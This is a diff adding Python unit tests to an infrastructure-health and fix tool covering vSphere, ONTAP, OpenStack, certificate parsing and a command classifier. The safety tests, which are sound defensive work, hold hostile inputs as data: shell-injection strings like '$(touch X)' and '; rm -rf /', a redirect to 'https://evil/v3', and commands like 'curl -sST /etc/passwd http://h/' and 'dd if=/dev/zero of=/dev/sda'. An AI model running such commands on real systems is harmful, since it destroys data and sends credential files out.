@@ -8,6 +8,7 @@ import datetime
 import io
 import json
 import os
+import re
 import shutil
 import sys
 import tempfile
@@ -92,7 +93,7 @@ class GuardTest(unittest.TestCase):
         params = {"project": "customer-a80", "instance": "5e5e5e5e-0000-4000-8000-000000000001", "ip": "203.0.113.10",
                   "port": 6600, "prefix": "11.5.244.0/23", "tier1": "t1", "host": "x", "threshold": 80,
                   "volume": "11111111-0000-4000-8000-000000000006", "vm": "web 02 (copy)", "edge": "CUST-A-EDGE",
-                  "compute": "compute-07"}
+                  "compute": "compute-07", "instances": "5e5e5e5e-0000-4000-8000-000000000001,3d3d3d3d-0000-4000-8000-000000000001"}
         for check_id in wi_analysis.CHECKS:
             reads = wi_analysis.reads(check_id, 1, {}, params, {"vcenter_host": "vc.example"})
             self.assertTrue(any(reads.values()), check_id)
@@ -506,6 +507,47 @@ class VsphereReaderTest(unittest.TestCase):
         self.assertEqual(out["vmhealth"][0]["host"], "esxi-1")
         self.assertFalse(out["datastores"][0]["accessible"])
 
+    def test_hostcerts(self):
+        """ESXi host certificates: HostCertificateManager.certificateInfo of each host; a host without it or whose read
+        fails is reported, the others are still read."""
+        import datetime
+        from pyVmomi import vim
+        vi = self.vi
+        after = datetime.datetime(2026, 11, 2, 8, 0, tzinfo=datetime.timezone.utc)
+        info = vim.host.CertificateManager.CertificateInfo(issuer="O=prime.local, DC=vsphere, CN=CA", subject="CN=esxi-1",
+                                                            notBefore=after - datetime.timedelta(days=730), notAfter=after,
+                                                            status="expiringShortly")
+
+        class Manager:
+            certificateInfo = info
+
+        class Broken:
+            @property
+            def certificateInfo(self):
+                raise RuntimeError("NoPermission: Host.Config.Certificate")
+
+        def view_props(content, vimtype, paths):
+            self.assertIn("configManager.certificateManager", paths)
+            return {"host-10": {"name": "esxi-1", "runtime.connectionState": "connected", "configManager.certificateManager": Manager()},
+                    "host-11": {"name": "esxi-2", "runtime.connectionState": "notResponding"},
+                    "host-12": {"name": "esxi-3", "runtime.connectionState": "connected", "configManager.certificateManager": Broken()}}
+
+        class Si:
+            def RetrieveContent(self):
+                return object()
+        old = vi.view_props
+        vi.view_props = view_props
+        try:
+            out = vi.health(Si(), ["hostcerts"])
+        finally:
+            vi.view_props = old
+        json.dumps(out)
+        h = {x["name"]: x for x in out["hostcerts"]}
+        self.assertEqual((h["esxi-1"]["not_after"], h["esxi-1"]["status"], h["esxi-1"]["subject"]),
+                         (after.isoformat(), "expiringShortly", "CN=esxi-1"))
+        self.assertIn("not connected", h["esxi-2"]["error"])
+        self.assertIn("NoPermission", h["esxi-3"]["error"])
+
     def test_one_set_failing_keeps_the_others(self):
         vi = self.vi
 
@@ -523,6 +565,229 @@ class VsphereReaderTest(unittest.TestCase):
             vi.read_alarms, vi.read_datastores = old_alarms, old_ds
         self.assertIn("InvalidProperty", out["errors"]["alarms"])
         self.assertEqual(out["datastores"], [{"name": "DS-1"}])
+
+
+class PaginationTest(unittest.TestCase):
+    """REST lists longer than one answer are read to their end and merged (ONTAP _links.next, NSX cursor, vCloud
+    page / pageCount); "the latest N" (sorted) is never followed; a list read only in part is said in the result."""
+
+    def test_pages(self):
+        reads = {"ontap": {"luns": "/api/storage/luns?fields=name&max_records=2",
+                           "ev": "/api/support/ems/events?order_by=time%20desc&max_records=2"},
+                 "nsxt": {"certs": "/api/v1/trust-management/certificates?details=true"},
+                 "vcd": {"edges": "/cloudapi/1.0.0/edgeGateways?pageSize=1",
+                         "tasks": "/api/query?type=adminTask&format=records&pageSize=1&sortDesc=startDate"}}
+        data = {"luns": {"status": 200, "json": {"records": [1, 2], "_links": {"next": {"href": "/api/storage/luns?start.name=/vol/a/l&max_records=2"}}}},
+                "ev": {"status": 200, "json": {"records": [1, 2], "_links": {"next": {"href": "/api/support/ems/events?x=1"}}}},
+                "certs": {"status": 200, "json": {"results": ["a"], "cursor": "c=="}},
+                "edges": {"status": 200, "json": {"values": ["e1"], "page": 1, "pageCount": 3}},
+                "tasks": {"status": 200, "json": {"record": ["t1"], "page": 1, "pageSize": 1, "total": 9}}}
+        pages = wi_analysis.next_pages(data, reads)
+        self.assertEqual(pages["ontap"], {"luns:p2": "/api/storage/luns?start.name=%2Fvol%2Fa%2Fl&max_records=2"})   # not ev
+        self.assertEqual(pages["nsxt"], {"certs:p2": "/api/v1/trust-management/certificates?details=true&cursor=c%3D%3D"})
+        self.assertEqual(sorted(pages["vcd"]), ["edges:p2", "edges:p3"])   # every announced page; never the sorted tasks
+        data.update({"luns:p2": {"status": 200, "json": {"records": [3]}},
+                     "certs:p2": {"status": 503, "msg": "Service Unavailable"},
+                     "edges:p2": {"status": 200, "json": {"values": ["e2"], "page": 2, "pageCount": 3}},
+                     "edges:p3": {"status": 200, "json": {"values": ["e3"], "page": 3, "pageCount": 3}}})
+        merged = wi_analysis.merge_pages(data, reads)
+        self.assertFalse([k for k in merged if ":p" in k])   # the pages are merged and removed
+        self.assertEqual(merged["luns"]["json"]["records"], [1, 2, 3])
+        self.assertEqual(merged["edges"]["json"]["values"], ["e1", "e2", "e3"])
+        self.assertEqual(merged["certs"]["json"]["results"], ["a"])
+        self.assertIn("page 2 not read", merged["certs"]["more"])
+        self.assertEqual(wi_analysis.next_pages(merged, reads), {"ontap": {}, "nsxt": {}, "vcd": {}})
+        # a list cut short is said in the result of any check
+        res = wi_analysis.analyze("ontap-volume-lun-state", {"volumes": {"status": 200, "json": {"records": []}},
+                                                             "certs": merged["certs"]}, {}, {"now": 1})
+        step = {s["key"]: s for s in res["steps"]}["pages"]
+        self.assertIn("certs (1 page(s) read; page 2 not read", step["detail"])
+
+
+class FixSafetyTest(unittest.TestCase):
+    """What the code review of 2026-10-26 found in the OpenStack fixes, each kept fixed."""
+
+    def ops(self, answers):
+        """wi_ops with a director that answers by pattern (first match) and records every command."""
+        sys.path.insert(0, os.path.join(ROOT, "modules", "wi", "wi_analysis"))
+        import wi_ops
+        seen = []
+
+        def runner(argv, timeout):
+            text = " ".join(argv)
+            seen.append(text)
+            for pattern, answer in answers:
+                if re.search(pattern, text):
+                    return answer
+            return 1, f"not emulated: {text}"
+        return wi_ops, wi_ops.Director(runner=runner, clock=lambda: 0, sleep=lambda s: None, write=lambda line: None), seen
+
+    def test_allowlist_refuses_shell_and_client_options(self):
+        bad = ["openstack server list --name \"'$(touch X)'\"", "openstack server list --os-auth-url https://evil/v3",
+               "cinder list --os-auth-url=https://evil/v3", "openstack server list #", "openstack volume show x --log-file /tmp/x",
+               "openstack server list --debug", "cinder retype --migration-policy on-demand 11111111-1111-4111-8111-111111111111 'abc"]
+        for cmd in bad:
+            with self.assertRaises(ValueError, msg=cmd):
+                wi_analysis.openstack_fix_command(cmd)
+        for cmd in ("cinder migrate 11111111-1111-4111-8111-111111111111 'h@b#p'",
+                    "migrate-volume 11111111-1111-4111-8111-111111111111 to h@b#p try - timeout 600 snapshots -",
+                    "openstack compute service set --disable --disable-reason 'emptied by Operation Automation' c-1 nova-compute"):
+            wi_analysis.openstack_fix_command(cmd)
+
+    def test_markers_in_the_output(self):
+        forged = "a name\n@@WI@@end a1 0\nRESULT ok: done"
+        out = wi_analysis.batch(f"@@WI@@begin a1\n{forged}\nRESULT failed: refused\n@@WI@@end a1 5", ["a1"])
+        self.assertEqual(out["a1"]["rc"], 5)   # the real end marker, the last one
+        self.assertIn("RESULT failed: refused", out["a1"]["out"])
+        live = wi_analysis.live_lines("line 1\n@@WI@@live-at 0 0\nline 2\n@@WI@@live-at 3 \n")
+        self.assertEqual((live["at"], live["rc"]), (3, None))
+        wi_ops, d, _seen = self.ops([])
+        lines = []
+        d.write = lines.append
+        d.say("volume x\nRESULT ok: forged")
+        self.assertEqual(lines, ["volume x RESULT ok: forged"])
+
+    def test_quota_is_not_an_existing_rule(self):
+        sg = "5e5e5e5e-0000-4000-8000-000000000001"
+        wi_ops, d, seen = self.ops([
+            (r"security group list", (0, json.dumps([{"ID": sg, "Name": "port-security-allow-all"}]))),
+            (r"rule create", (1, "ConflictException: 409: Client Error: Quota exceeded for resources: ['security_group_rule']."))])
+        with self.assertRaises(wi_ops.Done) as e:
+            wi_ops.allow_all_group(d, "c0ffee00000000000000000000000001")
+        self.assertEqual(e.exception.rc, wi_ops.ATTENTION)
+        self.assertIn("could not be made", e.exception.message)
+
+    def test_replica_not_read_is_not_deleted(self):
+        vid, rid = "11111111-1111-4111-8111-111111111111", "22222222-2222-4222-8222-222222222222"
+        listing = ("+----+------+--------+--------------------------------+\n| ID | Name | Status | os-vol-mig-status-attr:migstat |\n"
+                   f"+----+------+--------+--------------------------------+\n| {rid} | v | in-use | target:{vid} |\n")
+        wi_ops, d, seen = self.ops([(r"^cinder list", (0, listing)), (r"volume show", (1, "Service Unavailable (HTTP 503)"))])
+        self.assertEqual(wi_ops.cleanup_replica(d, vid), [rid])
+        self.assertFalse([c for c in seen if "reset-state" in c or "cinder delete" in c], seen)
+        self.assertFalse(wi_ops.gone("public endpoint for volumev3 service in RegionOne region not found", "volume"))
+        self.assertTrue(wi_ops.gone("No volume with a name or ID of 'x' exists.", "volume"))
+
+
+class ControlPlaneParseTest(unittest.TestCase):
+    """What the control plane checks take from real output (RHOSP 16.2 and 17.1)."""
+
+    def test_model_count_reached(self):
+        from wi_analysis.control_plane import count_of, model_of, reached
+        self.assertEqual(model_of("OVSDB CLUSTER\n"), "RAFT")           # head -c 13 of a 17.x database file
+        self.assertEqual(model_of("OVSDB JSON 12\n"), "active/backup")  # 16.2 (standalone file)
+        self.assertEqual(model_of("\n"), "unknown")
+        self.assertEqual(count_of({"rc": 0, "out": "152340\n"}), 152340)
+        self.assertEqual(count_of({"rc": 1, "out": "0\n"}), 0)          # grep -c finds nothing: exit 1, still a count
+        self.assertIsNone(count_of({"rc": 1, "out": "ovn-sbctl: tcp:172.28.1.10:6642: database connection failed\n0"}))
+        self.assertIsNone(count_of({"skipped": "not read"}))
+        self.assertTrue(reached({"rc": 1, "out": "ERROR 1045 (28000): Access denied"}))   # the command failed, ssh did not
+        self.assertFalse(reached({"rc": 255, "out": "ssh: connect to host 192.168.253.10 port 22: No route to host"}))
+        self.assertFalse(reached({"skipped": "no access"}))
+
+
+class OntapHealthUnitTest(unittest.TestCase):
+    """ONTAP answers the flow test does not cover: takeover not possible while storage failover is not readable, an
+    offline FlexVol (no space given), EMS events of last month."""
+
+    def test_takeover_offline_old_events(self):
+        now = 1793000000
+        node = {"name": "N1", "ha": {"enabled": True, "takeover": {"state": "not_possible"}, "giveback": {"state": "nothing_to_giveback"},
+                                     "partners": [{"name": "N2"}]}}
+        res = wi_analysis.analyze("ontap-ha-redundancy", {"nodes": {"status": 200, "json": {"records": [node]}},
+                                                          "failover": {"status": 403, "msg": "not authorized"}}, {}, {"now": now})
+        ha = {s["key"]: s for s in res["steps"]}["ha"]
+        self.assertEqual(ha["status"], "fail", ha)
+        self.assertEqual(ha["table"]["rows"][0][5], "not read")
+        self.assertIn("Takeover possible was not read", ha["detail"])
+        vols = [{"name": "vol_off", "svm": {"name": "s"}, "state": "offline", "space": {"size": 100}},
+                {"name": "vol_lun", "svm": {"name": "s"}, "state": "online", "space": {"size": 100, "used": 90}}]
+        luns = [{"name": "/vol/vol_off/l", "location": {"volume": {"name": "vol_off"}}, "status": {"state": "offline"}},
+                {"name": "/vol/vol_lun/l", "location": {"volume": {"name": "vol_lun"}}, "status": {"state": "online"}}]
+        old = datetime.datetime.fromtimestamp(now - 30 * 86400, datetime.timezone.utc).isoformat()
+        res = wi_analysis.analyze("ontap-volume-lun-state", {
+            "volumes": {"status": 200, "json": {"records": vols}}, "luns": {"status": 200, "json": {"records": luns}},
+            "events": {"status": 200, "json": {"records": [{"time": old, "node": {"name": "N1"}, "message": {"name": "wafl.vol.full"},
+                                                            "log_message": "old"}]}}}, {}, {"now": now})
+        st = {s["key"]: s for s in res["steps"]}
+        self.assertEqual(st["volumes"]["status"], "fail")      # the offline FlexVol is a finding of its own
+        self.assertEqual(st["autosize"]["status"], "ok", st["autosize"])   # not "full", and no autosize mode given: unknown
+        self.assertNotIn("events", st)                          # a month old: history
+
+
+class CertParseTest(unittest.TestCase):
+    """Expiry dates as each system writes them, and `getcert list` as the overcloud read filters it."""
+
+    def test_dates(self):
+        import datetime
+        from wi_analysis.cert_inventory import cn, days_left, when
+        utc = datetime.timezone.utc
+        t = datetime.datetime(2026, 11, 2, 13, 0, tzinfo=utc)
+        for text in ("2026-11-02T13:00:00Z", "2026-11-02T08:00:00-05:00", "2026-11-02 13:00:00 UTC", "2026-11-02T13:00:00.123+00:00",
+                     "2026-11-02T20:00:00+0700", 1793624400000, 1793624400, "1793624400000"):
+            self.assertEqual(when(text), t, text)
+        self.assertIsNone(when("unknown"))
+        self.assertIsNone(when(""))
+        self.assertEqual(days_left(t, t - datetime.timedelta(days=5, hours=1)), 5)
+        self.assertEqual(days_left(t, t + datetime.timedelta(hours=1)), -1)   # expired an hour ago: -1, not 0
+        self.assertEqual(cn("C=US, O=VMware, CN=esxi-01.prime.local"), "esxi-01.prime.local")
+        self.assertEqual(cn("CN=overcloud-controller-0.internalapi.prime.local,O=PRIME.LOCAL"), "overcloud-controller-0.internalapi.prime.local")
+        self.assertEqual(cn("plain name"), "plain name")
+
+    def test_vmca_roots_and_bad_pem(self):
+        """Every VMCA root is named CN=CA: the one that issued Machine SSL is found by its key, not by the name; a PEM
+        block that cannot be read is skipped (never an error of the whole check)."""
+        import datetime
+        from cryptography import x509
+        from cryptography.hazmat.primitives import hashes, serialization
+        from cryptography.hazmat.primitives.asymmetric import ec
+        from cryptography.x509.oid import NameOID
+        from wi_analysis.cert_inventory import issued_by, pem_certs
+        now = datetime.datetime.now(datetime.timezone.utc)
+        name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "CA"), x509.NameAttribute(NameOID.DOMAIN_COMPONENT, "vsphere")])
+
+        def make(subject, issuer, key, signer, days, ca, issuer_key=None):
+            b = (x509.CertificateBuilder().subject_name(subject).issuer_name(issuer).public_key(key.public_key())
+                 .serial_number(x509.random_serial_number()).not_valid_before(now - datetime.timedelta(days=900))
+                 .not_valid_after(now + datetime.timedelta(days=days))
+                 .add_extension(x509.SubjectKeyIdentifier.from_public_key(key.public_key()), critical=False)
+                 .add_extension(x509.AuthorityKeyIdentifier.from_issuer_public_key((issuer_key or key).public_key()), critical=False))
+            if ca:
+                b = b.add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)
+            return b.sign(signer, hashes.SHA256()).public_bytes(serialization.Encoding.PEM).decode()
+        old_key, new_key, leaf_key = (ec.generate_private_key(ec.SECP256R1()) for _ in range(3))
+        old = make(name, name, old_key, old_key, -200, True)
+        new = make(name, name, new_key, new_key, 3000, True)
+        leaf = make(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "vcsa.prime.local")]), name, leaf_key, new_key, 400, False, new_key)
+        (o,), (n,), (m,) = pem_certs(old), pem_certs(new), pem_certs(leaf)
+        self.assertEqual((o["subject"], n["subject"]), ("CA", "CA"))
+        self.assertTrue(issued_by(m, n))
+        self.assertFalse(issued_by(m, o))   # same name, other key: not the issuer
+        broken = "-----BEGIN CERTIFICATE-----\nTUlJQm9n\n-----END CERTIFICATE-----\n"
+        self.assertEqual(len(pem_certs(broken + leaf)), 1)
+
+    def test_getcert_local_zone(self):
+        import datetime
+        from wi_analysis.cert_inventory import rate_request
+        now = datetime.datetime(2026, 10, 26, 0, 0, tzinfo=datetime.timezone.utc)
+        req = {"status": "MONITORING", "stuck": "no", "expires": "2026-10-28 15:00:00 WIB"}
+        self.assertEqual(rate_request(req, now, 30, 7), ("fail", 2))   # the zone of the director, not UTC: still read
+        self.assertEqual(rate_request(dict(req, expires="soon-ish"), now, 30, 7)[0], "info")   # unreadable: not OK
+
+    def test_getcert(self):
+        from wi_analysis.cert_inventory import parse_getcert
+        text = ("Number of certificates and requests being tracked: 2.\n"
+                "Request ID '20240101000010':\n\tstatus: CA_UNREACHABLE\n\tca-error: Server at https://idm/ipa/xml failed request\n"
+                "\tstuck: no\n\tcertificate: type=FILE,location='/etc/pki/tls/certs/haproxy/internal_api.crt'\n\tCA: IPA\n"
+                "\tsubject: CN=c0.internalapi.prime.local,O=PRIME.LOCAL\n\texpires: 2026-10-30 13:52:48 UTC\n\tauto-renew: yes\n"
+                "Request ID 'libvirt':\n\tstatus: MONITORING\n\tstuck: no\n"
+                "\tcertificate: type=NSSDB,location='/etc/pki/nssdb',nickname='Server-Cert',token='NSS Certificate DB'\n"
+                "\tCA: IPA\n\tsubject: CN=c0\n\texpires: 2027-10-30 13:52:48 UTC\n\tauto-renew: no\n")
+        a, b = parse_getcert(text)
+        self.assertEqual((a["id"], a["status"], a["ca"], a["auto_renew"], a["file"]),
+                         ("20240101000010", "CA_UNREACHABLE", "IPA", "yes", "/etc/pki/tls/certs/haproxy/internal_api.crt"))
+        self.assertIn("failed request", a["ca_error"])
+        self.assertEqual((b["id"], b["file"], b["auto_renew"]), ("libvirt", "/etc/pki/nssdb (Server-Cert)", "no"))
+        self.assertEqual(parse_getcert("Number of certificates and requests being tracked: 0."), [])
 
 
 class OvercloudInventoryTest(unittest.TestCase):
@@ -569,6 +834,143 @@ class OvercloudInventoryTest(unittest.TestCase):
         self.assertEqual(sorted(tried), ["TripleO inventory", "ctlplane ports", "metalsmith list", "openstack server list"])
 
 
+class ProgressTest(unittest.TestCase):
+    """The progress bar of the run page (progress.py) and the live output of a fix item (wi_analysis.live_*)."""
+    def test_check_and_fix_progress(self):
+        from modules.wi import progress
+        task = lambda name, outcome="ok": [f"TASK [{name}] ******", f"{outcome}: [localhost]"]
+        lines = task("Validate input") + task("Plan of the check") + task("Phase 1: what to read") + task("Phase 1: OpenStack")
+        bar = progress.of_check(lines + ["TASK [Phase 2: what to read] ***"], 4)
+        self.assertTrue(10 < bar["percent"] < 50, bar)
+        self.assertEqual(bar["current"], "Planning the reads of step 2 of 4")
+        self.assertEqual(bar["steps"][-1], {"name": "Planning the reads of step 2 of 4", "status": "running"})
+        self.assertEqual(progress.of_check(lines, 4, done=True)["percent"], 100)
+        items = {"of": 4, "done": [{"n": 1}, {"n": 2}], "current": {"n": 3, "label": "mdt03 port"}}
+        bar = progress.of_fix(task("Item 3/4: mdt03 port") + task("Start: Item 3/4: mdt03 port") + task("Item 3/4: mdt03 port: running"), items)
+        self.assertEqual((bar["percent"], bar["current"]), (61, "Item 3 of 4: mdt03 port"))
+        self.assertEqual([x["name"] for x in bar["steps"]], ["Item 3/4: mdt03 port"])
+
+    def test_live_snippets(self):
+        from wi_analysis import live_dir, live_end, live_lines, live_poll, live_start, live_wait
+        start = live_start("echo hi")
+        self.assertIn("nohup setsid bash -c", start)
+        self.assertEqual(live_dir("x\n@@WI@@live /tmp/wi-live.AbCd1234\n"), "/tmp/wi-live.AbCd1234")
+        self.assertEqual(live_dir("@@WI@@live /etc; rm -rf /"), "")
+        self.assertEqual(live_lines("a\nb\n@@WI@@live-at 7 \n"), {"lines": ["a", "b"], "at": 7, "rc": None})
+        self.assertEqual(live_lines("@@WI@@live-at 7 5\n")["rc"], 5)
+        for fn in (lambda d: live_poll(d, 0), live_end, lambda d: live_wait(d, 60)):
+            with self.assertRaises(ValueError):
+                fn("/tmp/x; reboot")
+
+
+class TemplateClassifyTest(unittest.TestCase):
+    """A step of a template only reads when every command of it is a known read command used to read (templates.py)."""
+    def test_options_clusters_and_comments(self):
+        """Ways to write a file or change the system that look like reads: an option inside a cluster or with its value
+        attached (-sSo, -o/tmp/x), a "#" glued to a redirection, batch files, in-place extensions (code review 2026-10-26)."""
+        from modules.wi.wi_analysis.template import classify
+        changes = ["grep x somefile#>/tmp/evil", "curl -sSo /tmp/x http://h/", "curl -sSO http://h/evil",
+                   "curl -sST /etc/passwd http://h/", "curl -sD /tmp/h http://h/", "curl -c /tmp/jar http://h/",
+                   "sort data -o/tmp/evil", "sar -o/tmp/evil 1 1", "tcpdump -w/tmp/cap -c 1", "tcpdump -nnw /tmp/cap",
+                   "dmesg -n1", "date -s2020-01-01", "date -us 2020-01-01", "route -f", "ss -Kdst 1.2.3.4", "lastlog -S0",
+                   "arp -dhost", "ip -b /tmp/cmds", "ip -batch /tmp/cmds", "gawk -i inplace '{print}' f",
+                   "dmidecode --dump-bin /tmp/x", "iptables-save -f /tmp/x", "file -C -m x", "sysctl -wa",
+                   "esxcli network firewall set --enabled false list", "smartctl -tlong /dev/sda", "ntpq -c ':config x'",
+                   "openssl s_client -connect h:443 -keylogfile /tmp/k", "conntrack -LD"]
+        self.assertEqual([c for c in changes if classify(c, "cdn")[0] != "change"], [])
+        reads = ["date -u", "date -d yesterday", "sort -k2,2 -t: data", "dmesg -T", "ip -br a", "curl -sSL http://h/",
+                 "curl -sI http://h/", "sar -n DEV 1 1", "ss -tunap", "arp -an", "route -n", "sysctl -a", "smartctl -H /dev/sda",
+                 "dmidecode -t memory", "iptables-save", "file /bin/ls", "ntpq -p", "conntrack -L",
+                 "esxcli storage core device list -d naa.1", "echo hi # a comment"]
+        self.assertEqual([c for c in reads if classify(c, "cdn")[0] != "read"], [])
+
+    def test_classify(self):
+        from modules.wi.wi_analysis.template import classify
+        reads = ["df -h /", "sudo du -sh /var/log/* 2>/dev/null | sort -h | tail -5", "systemctl is-active nginx",
+                 "ip addr show dev eth0", "sed -n '1,5p' /etc/hosts", "find /var/log -name '*.gz' -mtime +7",
+                 "curl -s https://example.com/health", "journalctl -u nginx --since -1h", "docker ps -a",
+                 "iptables -L -n -v", "timeout 5 ping -c 3 192.0.2.1", "grep -c error /var/log/syslog || true",
+                 "awk '{print $1}' /proc/loadavg", "hostname", "nvidia-smi -q", "esxcli network ip interface list"]
+        changes = ["systemctl restart nginx", "rm -rf /tmp/x", "cat /etc/passwd > /tmp/x", "echo $(id)", "ip link set eth0 down",
+                   "sed -i s/a/b/ f", "sed 'e reboot' f", "find /var -name '*.log' -delete", "curl -X POST https://example.com",
+                   "journalctl --vacuum-size=1G", "docker restart lb", "iptables -F", "iptables -L -Z", "FOO=1 cat x",
+                   "awk '{system(\"reboot\")}' f", "cat x &", "tee /etc/x", "hostname newname", "xargs rm",
+                   "bash -c 'df -h'", "nvidia-smi -r", "esxcli system maintenanceMode set -e true", "dd if=/dev/zero of=/dev/sda"]
+        for cmd in reads:
+            self.assertEqual(classify(cmd, "linux" if not cmd.startswith(("nvidia", "esxcli")) else "gb200"), ("read", ""), cmd)
+        for cmd in changes:
+            self.assertEqual(classify(cmd, "linux")[0], "change", cmd)
+        self.assertEqual(classify("show interfaces", "vyos")[0], "read")
+        self.assertEqual(classify("show interfaces", "linux")[0], "change")
+        self.assertEqual(classify("set system host-name x", "vyos")[0], "change")
+        self.assertEqual(classify("display bgp peer", "huawei")[0], "read")
+        self.assertEqual(classify("system-view", "huawei")[0], "change")
+
+    def test_reads_per_group(self):
+        from modules.wi.wi_analysis.template import Template, VYOS_OP
+        steps = [{"title": "a", "command": "show interfaces | grep eth0"}, {"title": "b", "command": "sudo cat /etc/x"},
+                 {"title": "c", "command": "configure"}]
+        vyos = Template.reads(1, {}, {}, {"template": {"group": "vyos", "steps": steps}})
+        self.assertEqual(vyos["host"], {"conn": "uname -n", "s1": f"{VYOS_OP} show interfaces | grep eth0", "s2": "SUDO cat /etc/x"})
+        huawei = Template.reads(1, {}, {}, {"template": {"group": "huawei", "steps": [{"title": "p", "command": "display bgp peer"}]}})
+        self.assertEqual(huawei, {"device": {"s1": "display bgp peer"}})
+
+
+
+class TemplateWaitTest(unittest.TestCase):
+    """Wait before the next step (2026-10-26): between read steps inside the check, after change steps inside the fix (the
+    last of them holds the check that runs again after the fix); within MAX_WAIT per step and MAX_WAITS in all."""
+    STEPS = [{"title": "status", "command": "systemctl is-active nginx", "wait": 5, "expect": "^active"},
+             {"title": "restart", "command": "sudo systemctl restart nginx", "wait": 30},
+             {"title": "again", "command": "systemctl is-active nginx", "wait": 90},
+             {"title": "reload", "command": "sudo systemctl reload nginx", "wait": 0},
+             {"title": "port", "command": "ss -lnt", "wait": 0}]
+
+    def test_where_the_waits_are(self):
+        from modules.wi.wi_analysis.template import waits, wait_text
+        self.assertEqual(waits(self.STEPS, "linux"), {"read": {1: 5, 3: 90}, "change": {2: 30}})
+        self.assertEqual(waits([{"title": "a", "command": "uptime", "wait": 60}], "linux"), {"read": {}, "change": {}})
+        self.assertEqual(waits([{"title": "a", "command": "display version", "wait": 5}] * 2, "huawei"), {"read": {}, "change": {}})
+        odd = [{"title": "a", "command": "uptime", "wait": "x"}, {"title": "b", "command": "uptime", "wait": 99999},
+               {"title": "c", "command": "uptime"}]
+        self.assertEqual(waits(odd, "linux")["read"], {2: 1800})
+        self.assertEqual([wait_text(x) for x in (1, 60, 90, 1800)], ["1 second", "1 minute", "1 minute 30 seconds", "30 minutes"])
+
+    def test_reads_result_and_fix(self):
+        from modules.wi.wi_analysis.template import Template
+        ctx = {"template": {"id": "tpl-x", "group": "linux", "shell": "sh", "steps": self.STEPS}, "host_name": "app-vm-01"}
+        reads = Template.reads(1, {}, {}, ctx)["host"]
+        self.assertEqual(list(reads), ["conn", "s1", "w1", "s3", "w3", "s5"])   # in the same script, in this order
+        self.assertEqual((reads["w1"], reads["w3"]), ("sleep 5", "sleep 90"))
+        data = {"conn": {"rc": 0, "out": "app-vm-01"}, "s1": {"rc": 3, "out": "inactive"}, "w1": {"rc": 0, "out": ""},
+                "s3": {"rc": 3, "out": "inactive"}, "w3": {"rc": 143, "out": ""}, "s5": {"rc": 0, "out": "LISTEN 0 511 *:80"}}
+        r = Template.analyze(data, {}, ctx)
+        steps = {s["key"]: (s["status"], s["title"]) for s in r["steps"]}
+        self.assertEqual(steps["w1"], ("info", "Wait 5 seconds"))
+        self.assertEqual(steps["w3"][0], "skip")   # the wait was stopped: never shown as waited
+        rec = r["recommendations"][0]
+        self.assertEqual(rec["action"]["commands"], ["sudo systemctl restart nginx", "sleep 30", "sudo systemctl reload nginx"])
+        self.assertEqual(rec["action"]["wait"], 30)
+        self.assertIn("sleep 30   # wait 30 seconds, before the next step", rec["commands"])
+        last = dict(ctx, template=dict(ctx["template"], steps=self.STEPS[:4] + [dict(self.STEPS[3], wait=60)]))
+        self.assertIn("sleep 60   # wait 1 minute, then the check runs again", Template.analyze(data, {}, last)["recommendations"][0]["commands"])
+
+    def test_form_limits_and_time_limit(self):
+        from modules.wi import templates
+        body = {"name": "nginx", "activity": "troubleshoot", "category": "linux", "group": "linux", "steps": self.STEPS}
+        t = templates.clean(body)
+        self.assertEqual([s["wait"] for s in t["steps"]], [5, 30, 90, 0, 0])
+        for steps, error in (([{"title": "a", "command": "uptime", "wait": 1801}], "0 to 30 minutes"),
+                             ([{"title": "a", "command": "uptime", "wait": -1}], "0 to 30 minutes"),
+                             ([{"title": "a", "command": "uptime", "wait": "soon"}], "whole number"),
+                             ([{"title": "a", "command": "uptime", "wait": 1800}] * 3, "add up to at most 60 minutes")):
+            with self.assertRaisesRegex(ValueError, error):
+                templates.clean(dict(body, steps=steps))
+        with self.assertRaisesRegex(ValueError, "without waits"):
+            templates.clean(dict(body, group="huawei", steps=[{"title": "a", "command": "display version", "wait": 5}]))
+        check = {"template": {"group": "linux", "steps": t["steps"]}}
+        self.assertEqual(templates.read_wait(check), 95)   # added to the time limit of the run
+
 class CatalogTest(unittest.TestCase):
     def test_catalog_covers_checks(self):
         from modules.wi import catalog
@@ -577,11 +979,43 @@ class CatalogTest(unittest.TestCase):
         for c in ready:
             self.assertIn(c["id"], wi_analysis.CHECKS, c["id"])
             self.assertTrue(c["wi"] or c.get("basis") == "platform", c["id"])
-        pages = {w["page"] for c in catalog.CATALOG["checks"] for w in c["wi"]}
+        pages = {w["page"] for c in catalog.CATALOG["checks"] for w in c["wi"] if w.get("page")}
         self.assertGreaterEqual(len(pages), 50)   # every work instruction of the Knowledge Base has an entry
         for c in catalog.CATALOG["checks"]:
             for w in c["wi"]:
-                self.assertTrue(w["url"].startswith("https://kb.example.com/") and w["url"].endswith(f"-{w['page']}"))
+                if w.get("page"):
+                    self.assertTrue(w["url"].startswith("https://kb.example.com/") and w["url"].endswith(f"-{w['page']}"))
+                else:   # a WI not in the Knowledge Base yet (e.g. "FDB Learning Issue"): its title, no link
+                    self.assertEqual(w["url"], "", w)
+                    self.assertTrue(w["title"], c["id"])
+
+    def test_activities(self):
+        # every check has one activity (the menu groups by it); platform checks default to health, the rest to troubleshoot
+        from modules.wi import catalog
+        by = {}
+        for c in catalog.CATALOG["checks"]:
+            self.assertIn(c["activity"], catalog.ACTIVITY_IDS, c["id"])
+            by.setdefault(c["activity"], set()).add(c["id"])
+        self.assertEqual(set(by), set(catalog.ACTIVITY_IDS))
+        self.assertIn("vyos-upgrade", by["operations"])
+        self.assertIn("sos-report", by["logs"])
+        self.assertIn("ovn-fdb-learning", by["troubleshoot"])
+        self.assertTrue(all(catalog.get(i).get("basis") == "platform" for i in by["health"]))
+
+    def test_purposes_and_symptoms(self):
+        # every check says what it does in one plain sentence; the symptoms of the home page point to existing checks
+        from modules.wi import catalog
+        ids = {c["id"] for c in catalog.CATALOG["checks"]}
+        for c in catalog.CATALOG["checks"]:
+            self.assertTrue(0 < len(c["does"]) <= 100, c["id"])
+            self.assertFalse(c["fix"] and c["status"] != "ready", c["id"])
+        self.assertTrue(catalog.get("volume-type-legacy")["fix"] and catalog.get("collect-logs")["collect"])
+        self.assertFalse(catalog.get("openstack-services")["fix"])
+        self.assertGreaterEqual(len(catalog.CATALOG["symptoms"]), 10)
+        for s in catalog.CATALOG["symptoms"]:
+            self.assertTrue(s["checks"] and set(s["checks"]) <= ids, s)
+        covered = {x for s in catalog.CATALOG["symptoms"] for x in s["checks"]}
+        self.assertIn("ovn-fdb-learning", covered)
 
     def test_params(self):
